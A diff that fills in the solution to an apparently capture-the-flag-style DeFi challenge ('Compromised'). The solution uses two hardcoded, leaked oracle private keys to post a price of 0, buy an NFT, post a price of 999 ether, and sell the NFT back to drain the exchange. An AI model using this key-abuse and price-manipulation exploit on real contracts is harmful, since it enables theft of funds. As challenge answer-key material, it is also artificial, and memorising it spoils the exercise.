@@ -25,6 +25,7 @@ contract CompromisedChallenge is Test {
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
         0xab3600bF153A316dE44827e2473056d56B774a40
+        
     ];
     string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
     uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];
@@ -75,7 +76,33 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+          // Private keys from decoded HTTP response
+      uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+      uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+      // Get source addresses
+      address source1 = vm.addr(privateKey1);
+      address source2 = vm.addr(privateKey2);
+      vm.startPrank(source1);
+      oracle.postPrice("DVNFT", 0 ether);
+      vm.stopPrank();
+      vm.startPrank(source2);
+      oracle.postPrice("DVNFT", 0 ether);
+      vm.stopPrank();
+      vm.startPrank(player);
+      uint256 id =exchange.buyOne{value: 0.1 ether}();
+      vm.stopPrank();
+      vm.startPrank(source1);
+      oracle.postPrice("DVNFT", 999 ether);
+      vm.stopPrank();
+      vm.startPrank(source2);
+      oracle.postPrice("DVNFT", 999 ether);
+      vm.stopPrank();
+      vm.startPrank(player);
+      nft.approve(address(exchange), id);
+      exchange.sellOne(id);
+      (bool success, ) = recovery.call{value: 999 ether}("");
+      require(success, "Transfer failed");
+      vm.stopPrank();
     }
 
     /**
